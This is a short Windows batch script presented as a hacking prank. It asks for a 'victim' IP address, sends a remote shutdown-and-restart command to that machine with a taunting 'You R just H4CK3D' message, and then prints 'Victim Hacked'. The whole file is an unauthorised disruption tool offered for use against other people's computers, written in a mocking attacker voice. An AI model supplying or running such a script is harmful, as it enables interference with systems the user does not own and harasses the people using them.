@echo off
echo.
set /p vic= Enter the IP of your victim : 
shutdown -m \\%vic% -r -c "You R just H4CK3D. Sucker. Shutdown in 20 secs. HA HA...." -t 60
echo Victim Hacked....
pause
exit